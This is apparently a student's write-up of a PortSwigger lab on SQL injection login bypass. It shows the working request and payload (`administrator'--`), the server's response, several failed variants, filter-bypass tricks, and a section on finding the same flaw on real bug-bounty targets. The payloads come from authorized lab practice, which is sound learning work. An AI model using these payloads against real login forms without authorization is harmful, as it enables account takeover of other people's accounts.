# LAB: <exact lab name>

|                             |                                                                                         |
| --------------------------- | --------------------------------------------------------------------------------------- |
| **Topic**                   | SQL injection                                                                           |
| **Difficulty**              | Apprentice                                                                              |
| **Date**                    | 2026-11-10                                                                              |
| **Time**                    | ~15                                                                                     |
| **Solved without solution** | yes                                                                                     |
| **Link**                    | [lab-login-bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass) |

## 1. Objective

Perform a SQL injection attack that logs in to the application as the administrator user

## 2. Surface

`POST /login` with body `username=...&password=...`
The 'username' enters the 'WHERE' clause of the credential check.

## 3. Hypothesis

If the query is 'SELECT \* FROM users WHERE username = '<user>' AND password = '<pass>"',
then breaking the check with a comment after username ignores the password —
as long as the user exists.

## 4. Payload that worked

Request:

```http
POST /login HTTP/2
Host: x.web-security-academy.net
Cookie: session=x
Content-Length: 77
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Origin: https://x.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://x.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=x&username=administrator'--&password=test
```

Response:

```http
HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=x; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

## 5. Why it works

Resulting query: SELECT \* FROM users WHERE username = 'administrator'--' AND password = 'x' Everything after - is commented out, so the password condition ceases to exist. The query becomes "is there an administrator user?"-and there is.

## 6. What I tried that failed

- `password=x'--` (comment injected in the **password** field) → no bypass.
  The query becomes `WHERE username='administrator' AND password='x'--'`:
  the syntax is valid, but the password check is _before_ the comment, so it
  still has to be correct.
  Lesson: a comment only removes conditions that come
  **after** the injection point-that's why injecting in the username field
  works and injecting in the password field doesn't.

- `password=x' OR '1'='1` → condition becomes
  `(username='administrator' AND password='x') OR '1'='1'`.
  Always true, but the row returned its a list, not `administrator`.
  Lesson: `OR 1=1` is useful for enumeration, not for
  targeting a specific account.

- `password=x' OR 1=1--` → same problem, plus a second lesson: `AND` binds
  tighter than `OR`, so the tautology applies to the whole expression and the
  app returns a 500, cause its expected to return only one user.

## 7. In a real target (bounty translation)

    Typical context: login, "forgot password", email verification, internal endpoints with user verification.
    Quick detect: send ' username → 500 or bank error; send user'- with any password → login without password = strong find.
    Reportable impact: total account takeover of any known user. In a real program, this is usually High/Critical-the impact is evident to any triager, so the report is quick to accept.
    Pay attention to the scope: test on your own account first; do not crash on a real customer account.

## 8. Bypass / variants noticed

If - is filtered, try # or /\*.
If the app trims spaces, try '- + control character.
Related classic case: injection that returns all users ('OR 1=1--)-useful for enumerating, less useful for logging in as a specific target.

## 9. Takeaway (one line)

Login is the target with the greatest impact and least effort: a ' in the username already says whether the field is injectable, and commenting out the password condition is an immediate takeover.
